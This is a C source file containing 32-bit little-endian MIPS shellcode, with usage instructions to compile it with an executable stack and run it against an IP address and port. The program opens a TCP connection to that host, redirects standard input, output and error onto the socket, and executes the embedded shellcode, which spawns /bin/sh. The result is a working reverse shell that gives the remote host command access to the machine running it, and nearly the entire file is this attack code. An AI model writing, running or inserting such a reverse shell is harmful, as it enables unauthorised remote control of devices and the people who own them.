#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "stdio.h"

/*
	mipsel reverse tcp shellcode 32bits
	usage:
		gcc shellcode.c -z execstack -o shellcode
		./shellcode ipaddr ipport
*/


char shellcode[] = {
				"\x50\x73\x06\x24" /*     li      a2,0x7350             */
				"\xff\xff\xd0\x04" /* LB: bltzal  a2,LB                 */
				"\x50\x73\x0f\x24" /*     li      $t7,0x7350 (nop)      */
				"\xff\xff\x06\x28" /*     slti    a2, $0,-1             */
				"\xe0\xff\xbd\x27" /*     addiu   sp,sp,-32             */
				"\xd7\xff\x0f\x24" /*     li      t7,-41                */
				"\x27\x78\xe0\x01" /*     nor     t7,t7,zero            */
				"\x21\x20\xef\x03" /*     addu    a0,ra,t7              */
				"\xe8\xff\xa4\xaf" /*     sw      a0,-24(sp)            */
				"\xec\xff\xa0\xaf" /*     sw      zero,-20(sp)          */
				"\xe8\xff\xa5\x23" /*     addi    a1,sp,-24             */
				"\xab\x0f\x02\x24" /*     li      v0,4011               */
				"\x0c\x01\x01\x01" /*     syscall                       */
				"/bin/sh"
};

int main(int argc, char *argv[])
{
		struct sockaddr_in sa;
		int s;

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(argv[1]);
		sa.sin_port = htons(atoi(argv[2]));

		s = socket(AF_INET, SOCK_STREAM, 0);
		connect(s, (struct sockaddr *)&sa, sizeof(sa));
		dup2(s, 0);
		dup2(s, 1);
		dup2(s, 2);
		void (*p)(void);
		p = (void *)shellcode;
		p();

		return 0;
}
